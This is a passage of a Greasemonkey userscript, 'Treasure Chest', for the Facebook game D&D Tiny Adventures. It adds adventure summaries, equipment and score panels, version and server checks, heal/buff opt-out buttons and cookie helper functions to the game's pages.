			var advdisp = "<table cellpadding='1' cellspacing='2'><tr>";      
			for (k=0; k<advsplitlen; k++) {	
				advdisp += "<td style='border: 1px solid black; background-color:#ffffff; width: 17px; text-align: center; font-size: 10px; font-face: arial;' valign='top'>" + (k+1) + "</td>";	      
			}      
			advdisp += "</tr><tr>";      
			for (k=0; k<advsplitlen; k++) {	
				advdisp += "<td style='border: 1px solid black; background-color:#ffffff; width: 17px; text-align: center; font-size: 9px; font-face: arial;' valign='top'>" + terrainWikiLink(advsplit[k]) + advsplit[k] + terrainWikiLink2(advsplit[k]) ;			
				advdisp += checkTerrain(advsplit[k]);	
				advdisp += "</td>";	      
			}
			advdisp += "</tr></table>";    
		}
	}
	if (displayme == "yes") {    
		innerdisp = "";    
		firstdisp += 1;    
		if (firstdisp == 1) {      

 
		   innerdisp +=  "<tr><td colspan=2>" + chardivs + "</td></tr>"
		}    
		innerdisp += x + "<tr><td style='width: 170px;'></td><td style='border: 1px solid black; background-color: #ffffcc; width: 420px;'><b><span style='font-size: 11px; font-face: arial;'>&nbsp;Adventure Summary for " + advname + "</b> (<a href='" + wikiurl + advwiki +"' target='_blank'>wiki</a>)<br/>" + advdisp + "</td></tr>"
        n.innerHTML = innerdisp;
		 
	}
}

// --------------------------------------------------------------------
// Check Class
 
function checkClass(cid) {  
	var d = document.getElementById(cid).nextSibling;  
	var x = d.innerHTML;  
	var xclasslen = (xclass.length);  
	for (z=0; z<xclasslen; z++) {
	    if (x.search(xclassid[z])!=-1) { 
		classtype = xclass[z] 
		}
	}
}

// --------------------------------------------------------------------
// adventure page adventure summary

function makeSummaryHtml(advname) {

	zzz = document.getElementsByTagName("b");
	zlen = zzz.length 
	var zdisp = "no"
	for (z=0; z<zlen; z++) { 
		if (zzz[z].innerHTML.search("Adventure Progress")!=-1) { 
 			zdisp = "yes"
		} else {
 			zidsp = "no"
		}
	}
	// alert(zdisp);
	
	var advid = "";
	var advlen = (adv.length);    

	encc = 0;	
	encc = GM_getValue(myfbid + "tcadvtxt");
	encc = encc.replace (/\/.*/, "");
	
	for (i=0; i<advlen; i++) {    
		if (advname == adv[i]) {   

			var advid = i;      
			var advenc = aenc[i];	      
			var advsplit = advenc.split("#");      
			var advsplitlen = (advsplit.length);            
			var advdisp = "";
			
			advdisp += "<table border='0' cellpadding='0' cellspacing='1'><tr><td width='420'><b><span style='font-size: 11px; font-face: arial;'>&nbsp;Summary for " + advname + "</b> (<a href='" + wikiurl + wiki[i] +"' target='_blank'>wiki</a>)<br/></td><td align='right' id='tc_score' rowspan='2'>Loading...</td></tr><tr><td width='420'>";      

			advdisp += "<table cellpadding='1' cellspacing='2'><tr>";      
			for (k=0; k<advsplitlen; k++) {	
			
				if (zdisp == "yes") {
					if (k <= encc) {
						if (k == encc) {
							var enccolor = "#ff8080"
						} else {
							var enccolor = "#d7d7d7"
						}
					} else {
						var enccolor = "white"
					}
				} else {
					var enccolor = "#d7d7d7"
				}				
				
				 
				advdisp += "<td style='border: 1px solid black; background-color:" + enccolor + "; width: 17px; text-align: center; font-size: 10px; font-face: arial;' valign='top'>" + (k+1) + "</td>";	      
			}      
			advdisp += "</tr><tr>";      
			for (k=0; k<advsplitlen; k++) {	
				advdisp += "<td style='border: 1px solid black; background-color:#ffffff; width: 17px; text-align: center; font-size: 9px; font-face: arial;' valign='top'>" + terrainWikiLink(advsplit[k]) + advsplit[k] + terrainWikiLink2(advsplit[k]);			
				advdisp += checkTerrain(advsplit[k]);	
				advdisp += "</td>";	      
			}      
			advdisp += "</tr></table>";  

			advdisp += "</td></tr></table>";  
			
			
			
		innerdisp = advdisp;       
		   
		return innerdisp;    
		}
	}
}

// --------------------------------------------------------------------
// Get Version Number From Server

function checkVersionNumber(version) {
	GM_setValue(myfbid + "vmsg","no")
	var surl = "http://www.bigottergames.com/downloads/javascript/tcversion.txt?nocache=" + Math.random();
	GM_xmlhttpRequest({
		method: "GET",
		url: surl,
		headers:{
			"User-Agent":"Mozilla/5.0",
			"Accept":"text/xml"
		},
		onload:function(response) {
			if (response.status == "200") {	
				newversion = response.responseText;
				if (version != newversion) {
					vermsg = "yes";
					GM_setValue(myfbid + "vmsg",vermsg)
 					setVersionMessage();
				}
			}
		}});
}
	
	
// --------------------------------------------------------------------
// Check if version server is responding

function checkOnline(online) {
	var svurl = "http://www.bigottergames.com/downloads/javascript/online.txt?nocache=" + Math.random();
	GM_xmlhttpRequest({
		method: "GET",
		url: svurl,
		headers:{
			"User-Agent":"Mozilla/5.0",
			"Accept":"text/xml"
		},
		onload:function(response) {
			if (response.status == "200") {	
				onlinex = response.responseText;
				if (onlinex != "on") {
					online = "off";
					GM_setValue("tcserver",online)
					serverColor();
			//		alert(online)
				} else {
					online = "on";
					GM_setValue("tcserver",online)
					serverColor();
			//		alert(online)
				}
			}
		}});
}


function serverColor() { 
	if (GM_getValue("tcserver") == "on") {
		var tcservcolor = "lime"
	} else {
		var tcservcolor = "red"
	} 
	tcserv = document.getElementById("tc_online");  	
	tcserv.style.backgroundColor = tcservcolor
}		
 
	
 
	
	
// --------------------------------------------------------------------

function setUpDivs() {  
	var tc = "";
	c = document.getElementById("swffbjsholder");   
	if (c != "" && c != null) {         

	
	
	// treasure chest title and version message
		tc = "<span id='treasure_chest' style='text-align: center; position: absolute; left: 50px; top: 10px; font-size: 10px; font-face: arial; width: 145px; height: 25px;'>Treasure Chest - <a href='" + scripturl + "' target='_blank'>v" + version + versuffix + "</a><br/><span id='treasure_chest_version_message' style='text-align: center; width: 150px;'></span><br/><span id='treasure_chest_message_line' style='text-align: center; width: 150px;'></span></span>";
 
 	// chest image 
		tc += "<div id='treasure_chest_img' style='position: absolute; left: 17px; top: 12px; width:31px; height: 33px;'><img src='" + tcimgchest + "'/></div>";  	 
 
 
 	// server indicator
 
		tc += "<div id='tc_online' style='position: absolute; left: 9px; top: 9px; width:3px; height: 3px; border: 1px solid black;' title='Server Indicator (Green: Online - Red: Offline'></div>";  		
 
	// clock listener 
		tc += "<div id='treasure_chest_test' style='position: absolute; left: 9px; top: 16px; width:3px; height: 3px; border: 1px solid black;' title='Clock Indicator (Blinking: ON - Red: Buffing - Green: Healing)'></div>";  	 

	

 	
		
	 // options 
 
 	var opset = GM_getValue(myfbid + 'tcoptions');

	if (opset == null || opset == '') {
		GM_setValue(myfbid + 'tcoptions','0');
		opset = '0';
	}
	
	if (opset == '1') {
		var opdisp1 = "visible"
	}
	if (opset == '0') {
		var opdisp1 = "hidden"
	}
 
		tc += "<div id='tc_options_panel' style='z-index: 10; position: absolute; left: 13px; top: 68px; width:170px; height: auto; border: 1px solid black; background-color: #ffffcc; visibility: " + opdisp1 + "'>" + opcontent + "</div>";  	

		tc += "<span id='treasure_chest_options' style='text-align: center; position: absolute; left: 10px; top: 48px; font-size: 10px; font-face: arial; width: 45px; height: 15px;'><a title='Options Panel (Click to Open/Close)' href='javascript:optionspanel();' ><div id='tc_options'>Options</div></a></span>";  

	// wiki 

		tc += "<span id='treasure_chest_wiki' style='text-align: center; position: absolute; left: 60px; top: 48px; font-size: 10px; font-face: arial; width: 69px; height: 15px;'><a title='D&D:TA Wiki (Click to Open)' href='" + wikiurl + "' target='_blank'>D&amp;D:TA Wiki</span>"; 	
	
	 // chat 
 
		tc += "<span id='treasure_chest_chat' style='text-align: center; position: absolute; left: 134px; top: 48px; font-size: 10px; font-face: arial; width: 57px; height: 15px;'><a title='Chat Window (Click to Open)' href='javascript:chatpop();'><div id='tc_chat_pop'>Open Chat</div></a></span>";   
		
		
	if (url.search("ViewTheShop.php")!=-1) {
		
		tc += "<div id='tc_equipment_main' style='position:fixed; width:200px; height: auto; margin-left: 630px; left: 50%px; top:50px; background:#ffffcc; border:2px solid black; z-index: 10;'><div style='width: 196px; background-color: black; color: white; padding: 2px;'><b>Equipment Info</b></div><div id='tc_equipment' style='width: 196px; padding: 2px;'>Equipment Loading...</div></div>";		
		
	}		


	if (url.search("ViewFriends.php")!=-1) {

	if (hbbuttons == "ON") {
	// don't heal me
	
	if (myhealval == "YES") {
		var hbuttonval = "Heal OFF"
	} else {
		var hbuttonval = "Heal ON"
	}

	if (mybuffval == "YES") {
		var bbuttonval = "Buff OFF"
	} else {
		var bbuttonval = "Buff ON"
	}

	
		tc += "<div id='treasure_chest_noheal' style='position: absolute; left: 448px; top: 73px; '><form name='nohealForm' method='POST' action='http://www.bigottergames.com/shout/noheal.php'><input type='hidden' name='user' size='25' value='" + myfbid + "'><input type='submit' value='" + hbuttonval + "'></form></div>";	

	// don't buff me
		tc += "<div id='treasure_chest_nobuff' style='position: absolute; left: 532px; top: 73px;  '><form name='nobuffForm' method='POST' action='http://www.bigottergames.com/shout/nobuff.php'><input type='hidden' name='user' size='25' value='" + myfbid + "'><input type='submit' value='" + bbuttonval + "'></form></div>";	
	}
	
		var tcah = GM_getValue(myfbid + 'tcahtoggle')
		if (tcah == 1) {
			var tcahvalue = "CHECKED";
		} else {
			var tcahvalue = "";
		}	

		tc += "<span id='treasure_chest_auto_heal' style='text-align: left; position: absolute; left: 425px; top: 25px; font-size: 10px; font-face: arial; width: 20px; height: 20px;'><input id='auto_heal' onclick='tcahtoggle()' type='checkbox' " + tcahvalue + "></span>";       

		tc += "<span id='treasure_chest_auto_heal_text' style='text-align: left; position: absolute; left: 446px; top: 28px; font-size: 10px; font-face: arial; color: grey; width: 60px; height: 15px;'>Auto Heal</span>";   

		var tcab = GM_getValue(myfbid + 'tcabtoggle')
		if (tcab == 1) {
			var tcabvalue = "CHECKED";
		} else {
			var tcabvalue = "";
		}	
	
		tc += "<span id='treasure_chest_auto_buff' style='text-align: left; position: absolute; left: 425px; top: 42px; font-size: 10px; font-face: arial; width: 20px; height: 20px;'><input id='auto_buff' onclick='tcabtoggle()' type='checkbox' " + tcabvalue + "></span>";       
	
		tc += "<span id='treasure_chest_auto_buff_text' style='text-align: left; position: absolute; left: 446px; top: 45px; font-size: 10px; font-face: arial; color: grey; width: 60px; height: 15px;'>Auto Buff</span>";       


		tc += "<span id='treasure_chest_auto_timer' style='text-align: center; position: absolute; left: 422px; top: 10px; font-size: 10px; font-face: arial; width: 80px; height: 20px;'>Auto Timer: 0</span>";  

 
 
 
 	var htot = GM_getValue(myfbid + "tchealtot")
	if (htot == null || htot == "") {
		htot = 0;
		GM_setValue(myfbid + "tchealtot",htot)
	}

 
	
	var btot = GM_getValue(myfbid + "tcbufftot")
	if (btot == null || btot == "") {
		btot = 0;
		GM_setValue(myfbid + "tcbufftot",btot)
	}
 
 		tc += "<span id='treasure_chest_bufftot' style='text-align: center; position: absolute; left: 505px; top: 10px; font-size: 10px; font-face: arial; width: 50px; height: 10px;'><a title='Total Buffed (Click To Reset)' href='javascript:bufftotclear();'><div id='tc_buff_tot'>" + btot + "</div></a></span>";   

		tc += "<span id='treasure_chest_buff' style='text-align: center; position: absolute; left: 505px; top: 24px; font-size: 10px; font-face: arial; width: 50px; height: 25px;'><a title='Buff All Friends' href='javascript:buffall();'><img src='" + tcimgbuff + "' border='0' id='tc_buff_img'/><br/><div id='tc_buff_msg'>Buff All</div></a></span>";   
 
		tc += "<span id='treasure_chest_healtot' style='text-align: center; position: absolute; left: 560px; top: 10px; font-size: 10px; font-face: arial; width: 50px; height: 10px;'><a title='Total Healed (Click To Reset)' href='javascript:healtotclear();'><div id='tc_heal_tot'>" + htot + "</div></a></span>";  

		tc += "<span id='treasure_chest_heal' style='text-align: center; position: absolute; left: 560px; top: 24px; font-size: 10px; font-face: arial; width: 50px; height: 25px;'><a title='Heal All Friends' href='javascript:healall();'><img src='" + tcimggetwell + "' border='0' id='tc_heal_img'/><br/><div id='tc_heal_msg'>Heal All</div></a></span>";  
 


	} 




	
	c.innerHTML = c.innerHTML + tc;

	}
}









	
// ===== Title & Version Display ==================================== 

function setVersionMessage() {  
	var tc = "";
	c = document.getElementById("treasure_chest_version_message");   
	if (c != "" && c != null) {         
		vermsg = GM_getValue(myfbid + "vmsg");     
		if (vermsg == "yes") {	
			tc += "<a href='" + scriptinstall + "' target='_blank' style='color: #cc0000;'>*** Update Available ***</a>"      
		}   
	c.innerHTML = c.innerHTML + tc;
	}
 
}



// --------------------------------------------------------------------
 
function get(gurl, cb) {
  GM_xmlhttpRequest({
    method: "GET",
     url: gurl,
     onload: function(xhr) { cb(xhr.responseText); }
  });
}

 


// --------------------------------------------------------------------
 
function invload() {
	get("http://apps.facebook.com/tinyadventures/ViewInventory.php", inventorycapture);
} 
 
 
function fillCharInfo() {
	cht = document.getElementById("char3");	
	if (cht != null) {
 		cht.innerHTML = GM_getValue(myfbid + "tccharinfo")
	}
}



function inventorycapture(text) {
	var xvalue = text.search("http://2974.voxcdn.com/ta/WebGraphics/Classes");
	xvalue -= 64
	var xvalue2 = text.search("Click on an inventory slot below");
	xvalue2 -= 67
	var slicedtext = text.slice(xvalue, xvalue2); 
	slicedtext = slicedtext.replace (/popupid/g, "popupid1000");	
 	slicedtext = slicedtext.replace (/\div\s*onmouseover=\"(.*)\"/g, "<div onmouseover=\"\"" )
 	slicedtext = slicedtext.replace (/\div\s*onmouseout=\"(.*)\"/g, "<div onmouseout=\"\"" )	
	GM_setValue(myfbid + "tccharinfo", slicedtext);
	return;
} 

// --------------------------------------------------------------------

function heroload() {
	get("http://apps.facebook.com/tinyadventures/index.php", herocapture);
}  
 
 
function fillEquipInfo() {
	cht = document.getElementById("tc_equipment");	
	if (cht != null) {
  		cht.innerHTML = GM_getValue(myfbid + "tcequipinfo")
	}
}  
 
function fillScore() {
	cht = document.getElementById("tc_score");	
	if (cht != null) {
  		cht.innerHTML = GM_getValue(myfbid + "tcscore")
	}
}   
 
function herocapture(text) {

// get loot
	var xvalue = text.search("Equipped Loot");
	xvalue += 13
 	var xvalue2 = text.search("http://2974.voxcdn.com/ta/WebGraphics/Bar/L.jpg");
	xvalue2 -= 0
	var slicedtext = text.slice(xvalue, xvalue2); 
    slicedtext = slicedtext.replace (/style=\"color:/g, "style=\"margin-top: 3px; color:");	
	GM_setValue(myfbid + "tcequipinfo", slicedtext);

// get current hit points 

//	var xxvalue = text.search("Current Hit Points");
//	xxvalue += 0
//	xxvalue2 =xxvalue + 520
//	var slicedtextx = text.slice(xxvalue, xxvalue2); 
//	GM_setValue(myfbid + "tcchp", slicedtextx);
	
// get current score etc 

	var xxxvalue = text.search("http://2974.voxcdn.com/ta/WebGraphics/Misc/loot20.png");
	xxxvalue -= 75
 	var xxxvalue2 = text.search("http://2974.voxcdn.com/ta/WebGraphics/Misc/d20.png");
	xxxvalue2 += 180
	var slicedtextxx = text.slice(xxxvalue, xxxvalue2); 
 	slicedtextxx = slicedtextxx.replace (/(.*)\<table\>/, "<table border='0' width='155' cellpadding='0' cellspacing='2'>" )
	slicedtextxx = slicedtextxx.replace ("<td style=\"width: 24px; padding-top: 4px;\"><img src=\"http://2974.voxcdn.com/ta/WebGraphics/Misc/loot20.png\" /></td>", "" )
	slicedtextxx = slicedtextxx.replace ("<td style=\"padding-top: 2px;\"><img src=\"http://2974.voxcdn.com/ta/WebGraphics/Misc/xp20.png\" /></td>", "" )
	slicedtextxx = slicedtextxx.replace ("<td style=\"padding-top: 2px;\"><img src=\"http://2974.voxcdn.com/ta/WebGraphics/Misc/time20.png\" /></td>", "" )
	slicedtextxx = slicedtextxx.replace ("<td style=\"padding-top: 2px;\"><img src=\"http://2974.voxcdn.com/ta/WebGraphics/Misc/d20.png\" /></td>", "" )
 	slicedtextxx = slicedtextxx.replace (/\<\/table\>(.*)/, "</table>" )		
 	slicedtextxx = slicedtextxx.replace ("width=\"90\"", "width=\"85\"" )
 	slicedtextxx = slicedtextxx.replace ("width=\"88\"", "" )
 	slicedtextxx = slicedtextxx.replace (/padding\-right\: 10px;/g, "" )
 	slicedtextxx = slicedtextxx.replace (/onmouseover=\"(.*);\"/, "" )
  	slicedtextxx = slicedtextxx.replace ("Encounter<br />", "" )
  	slicedtextxx = slicedtextxx.replace ("<br />(dd:hh:mm)", "" )
	GM_setValue(myfbid + "tcscore", slicedtextxx);		
	
  // alert(slicedtextxx)

	return;
} 
 
 
// --------------------------------------------------------------------

function resetAdventureCookies() {
	// clears potion and power checkbox toggles
	eraseCookie2(myfbid + 'tcpot1toggle')
	eraseCookie2(myfbid + 'tcpot2toggle')
	eraseCookie2(myfbid + 'tcpow1toggle')
	eraseCookie2(myfbid + 'tcpow2toggle')
	// resets potion and power textbox values 
	createCookie2(myfbid + 'tcpot1value','0',1)
	createCookie2(myfbid + 'tcpot2value','0',1)
	createCookie2(myfbid + 'tcpow1value','0',1)
	createCookie2(myfbid + 'tcpow2value','0',1)
	// resets the number of equipped potions cookie 
	eraseCookie2(myfbid + 'tcpotchk')	
	eraseCookie2(myfbid + 'tctrigger')
}

// --------------------------------------------------------------------

function checkGeneration() {  

	ccc = document.getElementsByTagName("div");	
	cccloop = 0
 	for (cw=1; cw<ccc.length; cw++) {	
 		if (ccc[cw].innerHTML.search("Generation:")!=-1) {
				cccloop = cw
		}	
 	}
	if (cccloop != 0) {
		xx = ccc[cccloop].innerHTML
		xx = xx.replace("Generation:","");	
		xx = xx.replace("<b>","");	
		xx = xx.replace("</b>","");	
		xx = xx.replace(" ","");	
	} else {
		cccloop = 0
		for (cw=1; cw<ccc.length; cw++) {
			if (ccc[cw].innerHTML.search("Level \<b\>\(.*)\<\/b\> \<a onmouseover")!=-1) {
				cccloop = cw
			}	
		}
		xxx = ccc[cccloop].innerHTML;
 		xxx = ccc[cccloop].innerHTML + "<br/><a class='f9' href='/tinyadventures/ViewRewards.php'>Generation: <b>0</b></a>";
 		ccc[cccloop].innerHTML = xxx	
	} 
}

// --------------------------------------------------------------------
// check classes for priest

function checkClasses() {  
	ccd = document.getElementsByTagName("a");	
	ccdloop = 0
 	for (cd=1; cd<ccd.length; cd++) {	
 		if (ccd[cd].innerHTML.search("Cleric")!=-1) {
				ccdloop = cd
		}	
 	}
	var tccleric = "no";
	if (ccdloop != 0) {
		tccleric = "yes";
	} else { 
		tccleric = "no";
	}			
	GM_setValue(myfbid + "tccleric",tccleric);
}

// --------------------------------------------------------------------
//Check For Level

function checkLevel() {  
	ccc = document.getElementsByTagName("div");	
	cccloop = 0
 	for (cw=1; cw<ccc.length; cw++) {	
 		if (ccc[cw].innerHTML.search("Level <b>")!=-1) {
				cccloop = cw
		}	
 	}
	if (cccloop != 0) {
		xx = ccc[cccloop].innerHTML
		xx = xx.replace("Level","");	
		xx = xx.replace("<b>","");	
		xx = xx.replace(/\<\/b\>(.*)/,"");	
		xx = xx.replace(" ","");	
		GM_setValue(myfbid + "tclevel",xx);
	}  
}

// --------------------------------------------------------------------
// check character health value

function checkHealth() {
	htest = document.getElementsByTagName("table")
	hlen = htest.length
	for (hi=0; hi<hlen; hi++) {	 
		if (htest[hi].innerHTML.search("Current Hit Points")!=-1) {
			hx = hi;
		}
	}
	hx = htest[hx].innerHTML
 	hx = hx.replace(/\w.*\<b\>/,"")
	hx = hx.replace(/\<\/b\>/,"")
	hx = hx.replace(/\<\/div\>/,"")
	hx = hx.replace(/\<\/div\>/,"")
	hx = hx.replace(/\<\/td\>/,"")
	hx = hx.replace(/\<\/tr\>/,"")
	hx = hx.replace(/\<\/tbody\>/,"")
 	hx = hx.replace(/\</,"")
 	hx = hx.replace(" / ","/")
	if (hx != null && hx != "") {	
		GM_setValue(myfbid + "tchealth",hx)	
	}
}	



// --------------------------------------------------------------------

function popchat() {
	var chtwin = window.open('','D&D:TA - Chat','left=20,top=20,width=300,height=380,toolbar=no, resizable=yes');
	var chtttx = "<html><title>D&D:TA - Chat</title><body leftmargin='0' topmargin='0' marginwidth='0' marginheight='0'><div id='cboxdiv' style='text-align: center; line-height: 0'><div><iframe frameborder='0' width='300' height='305' src='http://www3.cbox.ws/box/?boxid=3064122&amp;boxtag=3456&amp;sec=main' marginheight='2' marginwidth='2' scrolling='auto' allowtransparency='yes' name='cboxmain' style='border:#000000 1px solid;' id='cboxmain'></iframe></div><div><iframe frameborder='0' width='300' height='75' src='http://www3.cbox.ws/box/?boxid=3064122&amp;boxtag=3456&amp;sec=form' marginheight='2' marginwidth='2' scrolling='no' allowtransparency='yes' name='cboxform' style='border:#000000 1px solid;border-top:0px' id='cboxform'></iframe></div></div></body></html>"
	chtwin.document.open();
	chtwin.document.write(chtttx); 
	chtwin.document.close();
}



 


function minmaxpm() {

	var chset2 = GM_getValue(myfbid + 'tcchar');
	
	if (chset2 == '1') {
		document.getElementById('tc_refresh').style.display = 'inline'; 
		document.getElementById('char3disp').style.display = 'inline'; 
		document.getElementById('tc_plus_minus').innerHTML = '[-]';
		GM_setValue(myfbid + 'tcchar','0');
	}
	if (chset2 == '0') {
		document.getElementById('tc_refresh').style.display = 'none'; 
		document.getElementById('char3disp').style.display = 'none'; 
		document.getElementById('tc_plus_minus').innerHTML = '[+]';
		GM_setValue(myfbid + 'tcchar','1');
	}	
	

}
	
	
function optionspanel2() {

	var tcpanel = GM_getValue(myfbid + 'tcoptions');
	
	if (tcpanel == '1') {
		document.getElementById('tc_options_panel').style.visibility = 'hidden'; 
		GM_setValue(myfbid + 'tcoptions','0');
	}
	if (tcpanel == '0') {
		document.getElementById('tc_options_panel').style.visibility = 'visible'; 
		GM_setValue(myfbid + 'tcoptions','1');
	}	
	

}


//----------------------------------------------------------------------	






function checkhealstatus(fhealid) {	

	nohealtxt2 = GM_getValue(myfbid + "nohealloop")
	var nohealloop = nohealtxt2.split(',');

	var hskip = "heal"
	if (nohealloop != null && nohealloop != "") {
		nhlen = nohealloop.length;		
		for (nh=0; nh<nhlen; nh++) { 
			if (nohealloop[nh] == fhealid) {
				hskip = "skip"
			}			
		} 
	return hskip
	}
}

function checkbuffstatus(fbuffid) {	

	nobufftxt2 = GM_getValue(myfbid + "nobuffloop")
	var nobuffloop = nobufftxt2.split(',');

	var bskip = "buff"
	if (nobuffloop != null && nobuffloop != "") {
		nblen = nobuffloop.length;		
		for (nb=0; nb<nblen; nb++) { 
			if (nobuffloop[nb] == fbuffid) {
				bskip = "skip"
			}			
		} 
	return bskip
	}
}


function getnohealbufflists() {
// get list of peopel who do not want heals or buffs
		
var nohealtxt = "";
var nobufftxt = "";

GM_xmlhttpRequest({
  method:'GET',
  url:'http://www.bigottergames.com/shout/noheal.txt', 
  onload:function(xhr)
  {
    nohealtxt = xhr.responseText;
	nohealtxt = nohealtxt.replace (/\::/g, "," )
	nohealtxt = nohealtxt.replace (/\:/g, "" )
	GM_setValue(myfbid + "nohealloop",nohealtxt)
 //	alert("heal - " + nohealtxt)
    return;
  }
});

GM_xmlhttpRequest({
  method:'GET',
  url:'http://www.bigottergames.com/shout/nobuff.txt', 
  onload:function(xbr)
  {
    nobufftxt = xbr.responseText;
	nobufftxt = nobufftxt.replace (/\::/g, "," )
	nobufftxt = nobufftxt.replace (/\:/g, "" )
	GM_setValue(myfbid + "nobuffloop",nobufftxt)
//    alert("buff - " + nobufftxt)
    return;
  }
});

}

function checktcserver() {

}

 
 
function checkforerror() {
	erx = document.getElementById("errorTitle");	
	if (erx != null) {
		if (erx.innerHTML.search("Connection Interrupted")!=-1) {
			window.location.reload(true);
			return;	
		}
	}
}



// ====================================================================
// ===== Embeded Functions ============================================
// ====================================================================

function embedFunctions() {

var s = "function minmax() {  }"; 
embedFunction(s);

// --------------------------------------------------------------------

var s = "function chatpop() {  }"; 
embedFunction(s);

// --------------------------------------------------------------------

var s = "function createCookie(name,value,days) { if (days) { var date = new Date(); date.setTime(date.getTime()+(days*24*60*60*1000)); var expires = '; expires='+date.toGMTString(); } else var expires = ''; document.cookie = name+'='+value+expires+'; path=/'; }";
embedFunction(s);

// --------------------------------------------------------------------

var s = "function readCookie(name) { var nameEQ = name + '='; var ca = document.cookie.split(';'); for(var i=0;i < ca.length;i++) { var c = ca[i]; while (c.charAt(0)==' ') c = c.substring(1,c.length); if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length,c.length); } return null; }";
embedFunction(s);

// --------------------------------------------------------------------

var s = "function eraseCookie(name) { createCookie(name,'',-1); }";
embedFunction(s);

// --------------------------------------------------------------------

var s = "function healtotclear() { }";
embedFunction(s);

// --------------------------------------------------------------------

var s = "function bufftotclear() { }";
embedFunction(s);

// --------------------------------------------------------------------

var s = "function healall() {  }";
embedFunction(s);

//if (readCookie2('tcheal') == null) {
//	createCookie2('tcheal','0',1); 
//}

// --------------------------------------------------------------------

var s = "function buffall() {  }";
embedFunction(s);

//if (readCookie2('tcbuff') == null) {
//	createCookie2('tcbuff','0',1); 
//}

// --------------------------------------------------------------------
	
var s = "function refinv() { window.location.reload();  }";
embedFunction(s);

//if (readCookie2('tcinvrefresh') == null) {
//	createCookie2('tcinvrefresh','0',1); 
//}
 

var s = "function tcoptionclick() {  }"; 
embedFunction(s);

// --------------------------------------------------------------------

var s = "function tcahtoggle() {  }"; 
embedFunction(s);

// --------------------------------------------------------------------

var s = "function tcabtoggle() {  }"; 
embedFunction(s);

// --------------------------------------------------------------------

var s = "function optionspanel() {  }"; 
embedFunction(s);

// --------------------------------------------------------------------
 
var s = "function tcpot1toggle() { var p1 = readCookie('" + myfbid + "tcpot1toggle'); if (p1 == 1) { createCookie('" + myfbid + "tcpot1toggle','0',1); } else { createCookie('" + myfbid + "tcpot1toggle','1',1);}  }"; 
embedFunction(s);

// --------------------------------------------------------------------

var s = "function tcpot2toggle() { var p2 = readCookie('" + myfbid + "tcpot2toggle'); if (p2 == 1) { createCookie('" + myfbid + "tcpot2toggle','0',1); } else { createCookie('" + myfbid + "tcpot2toggle','1',1);}  }"; 
embedFunction(s);

// --------------------------------------------------------------------

var s = "function tcpow1toggle() { var w1 = readCookie('" + myfbid + "tcpow1toggle'); if (w1 == 1) { createCookie('" + myfbid + "tcpow1toggle','0',1); } else { createCookie('" + myfbid + "tcpow1toggle','1',1);}  }"; 
embedFunction(s);

// --------------------------------------------------------------------

var s = "function tcpow2toggle() { var w2 = readCookie('" + myfbid + "tcpow2toggle'); if (w2 == 1) { createCookie('" + myfbid + "tcpow2toggle','0',1); } else { createCookie('" + myfbid + "tcpow2toggle','1',1);}  }"; 
embedFunction(s);

// --------------------------------------------------------------------
 
var s = "function tcpot1value() { var pval1 = document.getElementById('tc_pot_1_text').value; createCookie('" + myfbid + "tcpot1value',pval1,1); }"; 
embedFunction(s);

// --------------------------------------------------------------------

var s = "function tcpot2value() { var pval2 = document.getElementById('tc_pot_2_text').value; createCookie('" + myfbid + "tcpot2value',pval2,1); }"; 
embedFunction(s);

// --------------------------------------------------------------------

var s = "function tcpow1value() { var wval1 = document.getElementById('tc_pow_1_text').value; createCookie('" + myfbid + "tcpow1value',wval1,1); }"; 
embedFunction(s);

// --------------------------------------------------------------------

var s = "function tcpow2value() { var wval2 = document.getElementById('tc_pow_2_text').value; createCookie('" + myfbid + "tcpow2value',wval2,1); }"; 
embedFunction(s);


// --------------------------------------------------------------------

var s = "function tcfrheal(frid) { createCookie('" + myfbid + "tcfrid',frid,7); }"; 
embedFunction(s);

// --------------------------------------------------------------------

var s = "function tcfrbuff(frid) { createCookie('" + myfbid + "tcfrid',frid,7); }"; 
embedFunction(s);

}




// ================= fin ==================
